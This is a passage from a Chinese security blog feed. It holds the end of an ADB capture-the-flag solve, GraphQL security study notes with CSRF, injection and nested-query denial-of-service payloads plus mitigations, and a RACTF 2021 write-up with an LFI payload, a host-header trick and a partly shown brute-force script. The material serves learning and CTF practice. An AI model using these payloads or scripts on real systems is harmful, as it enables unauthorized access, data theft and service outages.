&lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ConnectDevice&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">serial&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;adbaby.sstf.site:6666&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">protocol_handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_handle&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag:&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">sendafter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">protocol_handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">InteractiveShellCommand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">sendafter&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">sendafter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;415349420009&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{Do_Uth1nk_th1s_1s_adb}&lt;/code>&lt;/p></description></item><item><title>GraphQL学习笔记</title><link>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</link><pubDate>Fri, 03 Sep 2021 20:56:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</guid><description>&lt;h2 id="graphql简述">GraphQL简述&lt;/h2>
&lt;p>GraphQL是一种针对Graph（图状数据）查询很有优势的Query Language（查询语言），而涉及到存储时可以选择NoSQL, SQL或其它任意存储方式（例如文本文件、存内存里等）；这是一门便于前后端交互的语言，而不是便于后端和数据库交互的语言。&lt;/p>
&lt;p>应用GraphQL的一个很重要的前提是后端数据已经以图的结构进行保存，（并且一定情况下已经设置好基于隐私的访问控制 授权与鉴权，否则会直接被攻击者执行高危操作）。每次查询或更新都有自己的根节点，得到的数据是树状结构；如果希望以图的形式展示则前端不能简单的对其进行缓存，那必须使用相应的存储数据库，通过顶点的ID把不同节点之间的某些边重新连接起来。&lt;/p>
&lt;p>并不是所有场景都需要迁移到GraphQL，如果RESTful API已经能满足需求的话。&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://twitter.com/jlouis666/status/1018140132153667584">GraphQL is basically just sugar for a simply typed lambda calculus.&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h3 id="变更---mutations">变更 - Mutations&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">three important things:&lt;/a>&lt;/p>
&lt;p>mutations are just queries in different namespace, but do NOT mix them;&lt;/p>
&lt;p>arguments require Input Objects, not normal Objects;&lt;/p>
&lt;p>use xyzAttributes for anything you want to link, then let your backend sort out how to do the linking(just like any other system we currently use)&lt;/p>
&lt;/blockquote>
&lt;h3 id="内省---introspection">内省 - introspection&lt;/h3>
&lt;p>GraphQL 允许在查询的任何位置请求 &lt;code>__typename&lt;/code>，一个元字段(Meta fields)，以获得那个位置的对象类型名称。&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902180824151.png" alt="image-20210902180824151">&lt;/p>
&lt;p>我们也可以通过查询 &lt;code>__schema&lt;/code> 字段来向 GraphQL 询问哪些类型是可用的，类型有以下这些：&lt;/p>
&lt;ul>
&lt;li>Query, Character, Human, Episode, Droid - 这些是我们在类型系统中定义的类型。&lt;/li>
&lt;li>String, Boolean - 这些是内建的标量，由类型系统提供。&lt;/li>
&lt;li>&lt;code>__Schema&lt;/code>, &lt;code>__Type&lt;/code>, &lt;code>__TypeKind&lt;/code>, &lt;code>__Field&lt;/code>, &lt;code>__InputValue&lt;/code>, &lt;code>__EnumValue&lt;/code>, &lt;code>__Directive&lt;/code> - 这些有着两个下划线的类型是内省系统的一部分。&lt;/li>
&lt;/ul>
&lt;h2 id="敏感信息泄露越权">敏感信息泄露&amp;amp;越权&lt;/h2>
&lt;p>自动文档生成/解析 - &lt;a href="https://github.com/2fd/graphdoc">graphdoc&lt;/a> | &lt;a href="https://github.com/graphql/graphql-playground">graphql-playground&lt;/a> | &lt;a href="https://apis.guru/graphql-voyager/">graphql-voyager&lt;/a> &amp;hellip;&amp;hellip;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902183558042.png" alt="image-20210902183558042">&lt;/p>
&lt;p>由于对对象或属性的权限控制不完善，导致信息泄露，案例：&lt;a href="https://hackerone.com/reports/310946">hackerone 一系列信息泄露漏洞&lt;/a>&lt;/p>
&lt;p>在objects.types中寻找敏感信息，如email, password, secretkey, token, licensekey, session等，多多关注废弃字段（deprecated fields)。当字段被废弃后直接用&lt;code>__type&lt;/code>做内省确实查找不到，但当指定&lt;code>includeDreprecated: true&lt;/code>时，&lt;code>__type&lt;/code>仍然可以将废弃字段暴露出来。&lt;/p>
&lt;h2 id="graphql的认证方式">GraphQL的认证方式&lt;/h2>
&lt;p>GraphQL并没有规定任何身份认证和权限控制的相关内容，因此我们可以更灵活的在应用中实现各种粒度的认证和权限；但是也很容易写出一些“裸奔”的接口或无效认证无效的接口。&lt;/p>
&lt;h3 id="独立认证终端-restful">独立认证终端 (RESTful)&lt;/h3>
&lt;p>通用且官方推荐的方式，如果后端本身支持RESTful或有专门的认证服务器，可以修改少量代码实现GraphQL接口的认证。&lt;/p>
&lt;p>举例：添加jwt认证&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902200434456.png" alt="image-20210902200434456">&lt;/p>
&lt;h3 id="在graphql内认证">在GraphQL内认证&lt;/h3>
&lt;p>如果GraphQL的后端支持GraphQL不能支持RESTful，或全部请求都需要使用GraphQL，也可以用构造相关的Query Schema接口返回token的形式。&lt;/p>
&lt;p>举例：构造login的Query Schema，在返回值中携带token&lt;/p>
&lt;pre tabindex="0">&lt;code>type Query{
login(
username: String!
password: String!
): LoginMsg
type LoginMsg{
message: String
token: String
}
}
&lt;/code>&lt;/pre>&lt;p>在resolver中提供登录逻辑&lt;/p>
&lt;pre tabindex="0">&lt;code>import bcrypt from 'bcrptjs';
import jsonwebtoken from 'jsonwebtoken';
export const login = async(_, args, context) =&amp;gt; {
const db = await context.getDb();
const{username, password} = args;
const user = await db.collection('User').findOne({username: username});
if(await bcyrpt.compare(password, user.password)){
return{
message: 'Login success',
token: jsonwebtoken.sign({
user: user,
exp: Math.floor(Date.now() / 1000) + (60 * 60),
}, 'your secret'),
};
}
}
&lt;/code>&lt;/pre>&lt;p>登录成功后 我们把token设置在请求头中，继续请求GraphQL的其他接口，这时需要对ApolloServer进行如下配置&lt;/p>
&lt;pre tabindex="0">&lt;code>const server = new ApolloServer({
typeDefs: schemaText,
resolvers: resolverMap,
context: ({ ctx }) =&amp;gt; {
const token = ctx.req.headers.authorization || '';
const user = getUser(token);
return{
...user,
...ctx,
...app.context
};
},
});
&lt;/code>&lt;/pre>&lt;p>实现getUser函数&lt;/p>
&lt;pre tabindex="0">&lt;code>const getUser = (token) =&amp;gt; {
let user = null;
const parts = token.split(' ');
if(parts.length === 2){
const scheme = parts[0];
const credentials = parts[1];
if(/^Bearer$/i.test(scheme)){
token = credentials;
try{
user = jwt.verify(token, JWT_SECRET);
console.log(user);
}catch(e){
console.log(e);
}
}
}
return user
}
&lt;/code>&lt;/pre>&lt;p>配置好ApolloServer后，在resolver中校验user&lt;/p>
&lt;pre tabindex="0">&lt;code>import {ApolloError, ForbiddenError, AuthenticationError} from 'apollo-server';
export const blogs = async(_, args, context) =&amp;gt; {
const db = await context.getDb();
const user = context.user;
if(!user){
throw new AuthenticationError('You must be logged in to see blogs');
}
const {blogId} = args;
const cursor = {}；
if(blogId){
cursor['_id'] = blogId;
}
const blogs = await db
.collection('blogs')
.find(cursor)
.sort({publishedAt: -1})
.toArray();
return blogs;
}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902203603699.png" alt="image-20210902203603699">&lt;/p>
&lt;h2 id="更多安全漏洞">更多安全漏洞&lt;/h2>
&lt;p>Express-GraphQL：&lt;/p>
&lt;ul>
&lt;li>框架默认无防护&lt;/li>
&lt;li>自带GraphiQL&lt;/li>
&lt;/ul>
&lt;p>Graphene-Django：&lt;/p>
&lt;ul>
&lt;li>依赖Django的安全配置（Secure As Default）&lt;/li>
&lt;li>自带GraphiQL&lt;/li>
&lt;/ul>
&lt;p>GraphQL-PHP&lt;/p>
&lt;ul>
&lt;li>无关框架&lt;/li>
&lt;/ul>
&lt;h3 id="express-graphql-endpoint-csrf漏洞">Express-GraphQL Endpoint CSRF漏洞&lt;/h3>
&lt;pre tabindex="0">&lt;code>{&amp;quot;query&amp;quot;:&amp;quot;mutation {\n editProfile(name:\&amp;quot;hacker\&amp;quot;, age: 5) {\n name\n age\n }\n}&amp;quot;,&amp;quot;variables&amp;quot;:null}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902205831949.png" alt="image-20210902205831949">&lt;/p>
&lt;p>将Content-Type修改为application/x-www-form-urlencode，仍可成功执行&lt;/p>
&lt;pre tabindex="0">&lt;code>query=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%20
5)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210011480.png" alt="image-20210902210011480">&lt;/p>
&lt;p>直接配合burp自带的Generate CSRD POC&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210221214.png" alt="image-20210902210221214">&lt;/p>
&lt;h3 id="graphiql-clickjacking-漏洞">GraphiQL Clickjacking 漏洞&lt;/h3>
&lt;p>参见：https://github.com/graphql/graphiql/issues/683&lt;/p>
&lt;p>可以配合burp自带的Clickbandit进行攻击&lt;/p>
&lt;h3 id="graphql-injection-漏洞">GraphQL injection 漏洞&lt;/h3>
&lt;p>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">这是一个相当全的payloads&amp;amp;exps&lt;/a> | &lt;a href="https://gist.github.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da">这是一个自省payload&lt;/a>&lt;/p>
&lt;p>p神ppt里的示意图直接搬过来了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211535481.png" alt="image-20210902211535481">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211551814.png" alt="image-20210902211551814">&lt;/p>
&lt;p>仍然是拼接了恶意的GraphQL语句导致漏洞的发生，本质还是对用户输入的控制不严格；同类的漏洞还有xss, rce等等&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">有语法就有解析，有解析就会有结构和顺序，有结构和顺序就会有注入。&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>用“参数化查询”的方式来解决上述问题时，要确保后端的解析引擎没有大病&lt;/p>
&lt;h3 id="通过custom-scalar的注入-json">通过Custom Scalar的注入 (JSON)&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">NoSQL Injection is entirely possible when using GraphQL, and can creep into your application through the use of &amp;lsquo;custom scalar types&amp;rsquo;&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>————更多的GraphQLi相关问题可参见&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">这个git仓库&lt;/a>，一本满足（&lt;/p>
&lt;h3 id="拒绝服务">拒绝服务&lt;/h3>
&lt;p>GraphQL中的query和mutation的返回结果都是可以有嵌套的对象的，如果不对嵌套深度进行限制，有可能被利用从而进行拒绝服务攻击。&lt;/p>
&lt;p>一个举例：&lt;/p>
&lt;p>定义了Blog和Author:&lt;/p>
&lt;pre tabindex="0">&lt;code>type Blog{
_id: String!
type: BlogType
avatar: String
title: String
content: [String]
author: Author
....
}
type Author{
_id: String!
name: String
blog: [Blog]
}
&lt;/code>&lt;/pre>&lt;p>都有各自的Query:&lt;/p>
&lt;pre tabindex="0">&lt;code>extend type Query{
blogs(
blogId: ID
systemType: String!
): [Blog]
}
extend type Query{
author(
_id: String
): Author
}
&lt;/code>&lt;/pre>&lt;p>我们可以构造这样的查询，无限套娃导致dos&lt;/p>
&lt;pre tabindex="0">&lt;code>query GetBlogs($blogId: ID, $systemType: String!) {
blogs(blogId: $blogId, systemType: $systemType) {
_id
title
type
content
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
# and so on...
}
}
}
}
}
}
}
}
}
}
}
}
}
title
createdAt
publishedAt
}
}
publishedAt
}
}
&lt;/code>&lt;/pre>&lt;p>解决这个问题我们需要在GraphQL服务器上限制查询深度，同时设计GraphQL接口时尽量避免出现此类问题，以Node.js为例，graphql-depth-limit就可以解决这样的问题&lt;/p>
&lt;pre tabindex="0">&lt;code>// ...
import depthLimit from 'graphql-depth-limit';
// ...
const server = new ApolloServer({
typeDefs: schemaText,
resolvers: resolverMap,
context: ({ ctx }) =&amp;gt; {
const token = ctx.req.headers.authorization || '';
const user = getUser(token);
console.log('user', user)
return{
...user,
...ctx,
...app.context
};
},
validationRules: [ depthLimit(10) ]
});
// ...
&lt;/code>&lt;/pre>&lt;h3 id="graphene-django-debug模式下的安全问题">Graphene-Django DEBUG模式下的安全问题&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903201318096.png" alt="image-20210903201318096">&lt;/p>
&lt;h2 id="在ctf中的表现">在CTF中的表现&lt;/h2>
&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
&lt;p>[corCTF 2021]devme&lt;/p>
&lt;h2 id="结尾">结尾&lt;/h2>
&lt;p>&lt;a href="https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application">Damn Vulnerable GraphQL Application&lt;/a>-&amp;gt; 一个漏洞复现的靶场，包含了上面提到和没提到的GraphQL存在的洞&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull dolevf/dvga
docker run -d -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903203245165.png" alt="image-20210903203245165">&lt;/p>
&lt;p>已经有&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">写好的wp&lt;/a>了 不向互联网产出湿垃圾 从我做起&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://graphql.cn/">中文官网&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://graphqlapp.herokuapp.com/">在线GraphiQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/zhouyuexie/learn-graphql">learn-graphql&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.zhihu.com/question/264629587">什么是 GraphQL？&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.secpulse.com/archives/148242.html">玩转graphQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6844903795407716366">GraphQL 从入门到实践&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6844903841813495822">【CuteJavaScript】GraphQL真香入门教程&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xzfile.aliyuncs.com/upload/zcon/2018/7_%E6%94%BB%E5%87%BBGraphQL_phithon.pdf">攻击GraphQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">GraphQL安全指北&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.shuzhiduo.com/A/RnJW3BRoJq/">UWP GraphQL数据查询的实现&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">GraphQL Mutations&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">GraphQL NoSQL Injection Through JSON Types&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/">GraphQL Injection&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">【安全记录】玩转GraphQL - DVGA靶场（上）&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/mmJrE6uIBC-4ztr5PFZasA">【安全记录】玩转GraphQL - DVGA靶场（下）&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
&lt;/details>
&lt;hr>
&lt;p>开学了，不摆烂从我做起&lt;/p></description></item><item><title>RACTF2021 Wp</title><link>https://amiaaaz.github.io/2021/08/18/ractf2021-wp/</link><pubDate>Wed, 18 Aug 2021 17:07:55 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/18/ractf2021-wp/</guid><description>&lt;p>&lt;a href="https://2021.ractf.co.uk/">https://2021.ractf.co.uk/&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/ractf/challenges/tree/master/2021">https://github.com/ractf/challenges/tree/master/2021&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/404dcd/RACTF-challenges">https://github.com/404dcd/RACTF-challenges&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.ractf.co.uk/tag/ractf-2021/">https://blog.ractf.co.uk/tag/ractf-2021/&lt;/a>&lt;/p>
&lt;h2 id="webreally-awesome-monitoring-dashboard">Web/Really Awesome Monitoring Dashboard&lt;/h2>
&lt;blockquote>
&lt;p>🌟 Perfect infrastructure 🌟&lt;/p>
&lt;/blockquote>
&lt;p>是grafana&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005221430.png" alt="image-20210818005221430">&lt;/p>
&lt;p>但是版本也太新了吧8.1.1，弱口令也没有，抓包可以看到它在不停的请求各种api，其中有个/api/ds/query，以明文方式请求数据库内容&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005705121.png" alt="image-20210818005705121">&lt;/p>
&lt;p>那这就好说了，直接明牌了都&lt;/p>
&lt;pre tabindex="0">&lt;code>SELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%';
SELECT * FROM flags;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818011913101.png" alt="image-20210818011913101">&lt;/p>
&lt;p>————这个故事告诉我们对于权限的设置是很重要的，不要随便把api接口暴露出来，也不要明文传递信息&lt;/p>
&lt;h2 id="webreally-awesome-hidden-service">Web/Really Awesome Hidden Service&lt;/h2>
&lt;blockquote>
&lt;p>Ahoy, matey! Some dirty scallywags seem to not be respectin' th' pirate code! Teach them a lesson by findin' out who they be.&lt;/p>
&lt;pre tabindex="0">&lt;code>ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion
&lt;/code>&lt;/pre>&lt;/blockquote>
&lt;p>一个Tor的网站，走匿名方式&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818014430572.png" alt="image-20210818014430572">&lt;/p>
&lt;p>那首先要把隐藏在后面的真实ip给找出来。整个网页的内容没有什么特别的，但是通常容易被忽略的是favicon图像，这里可以参考这样一篇文章：&lt;a href="https://isc.sans.edu/forums/diary/Hunting+phishing+websites+with+favicon+hashes/27326/">Hunting phishing websites with favicon hashes&lt;/a>&lt;/p>
&lt;p>这里可以用&lt;a href="https://github.com/pielco11/fav-up">fav-up&lt;/a>一把梭（也就是自动化了提取图标-&amp;gt;计算mmhash值-&amp;gt;shodan搜索出ip这个过程），得到ip为&lt;code>178.62.4.214|178.62.15.164&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818021746841.png" alt="image-20210818021746841">&lt;/p>
&lt;p>&lt;code>ractf{DreadingPirates}&lt;/code>&lt;/p>
&lt;p>————除此之外还有一个非预期解，当用非法的host header请求时，会直接返回flag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -s --socks5-hostname localhost:9050 -H &lt;span style="color:#d88200">&amp;#34;Host: asd.com&amp;#34;&lt;/span> ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion &lt;span style="color:#111">|&lt;/span> grep &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;em>All you need to do is send the server an invalid host header, which will cause it to fail back to its default vhost which reveals the flag. In retrospect, the solution to this would have been to make the flag only visible on a specific vhost, rather than the default.&lt;/em>&lt;/p>
&lt;h2 id="webemojibook">Web/Emojibook&lt;/h2>
&lt;blockquote>
&lt;p>&lt;img src="https://b.thumbs.redditmedia.com/4z_KB1qtCsTjcUqxDTbVIpJlR-AMzqrPeZDIz7VKdko.png" alt="img">&lt;/p>
&lt;p>The flag is at &lt;code>/flag.txt&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>可以登录、注册账户、发布note、查看，给出了源码&lt;/p>
&lt;p>看源码，是django框架的后端，直奔settings.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815135148402.png" alt="image-20210815135148402">&lt;/p>
&lt;p>看到了熟悉的pickle&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815145254055.png" alt="image-20210815145254055">&lt;/p>
&lt;p>在仅有的这个app的view.py中有这样的代码，会在note的body部分匹配&lt;code>{{.*?}}&lt;/code>这样的内容并将其中的部分拼接到/emoji/后以image的形式加载出来，但是直接用{{/flag.txt}}是不可以的，这部分代码在forms.py中&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818031453613.png" alt="image-20210818031453613">&lt;/p>
&lt;p>所以最终的payload是 &lt;code>{..{/flag.txt}..}&lt;/code>&lt;/p>
&lt;p>&lt;code>ractf{dj4ng0_lfi}&lt;/code>&lt;/p>
&lt;p>————然而这里有个非预期，url部分可以直接修改note编号达到水平越权，也就是说可以通过爆破方式找到之前已经成功的note&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">logging&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">threading&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">thread_function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:30160/&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;base64&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;cmFjdGZ7&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">threads&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">):&lt;/span>
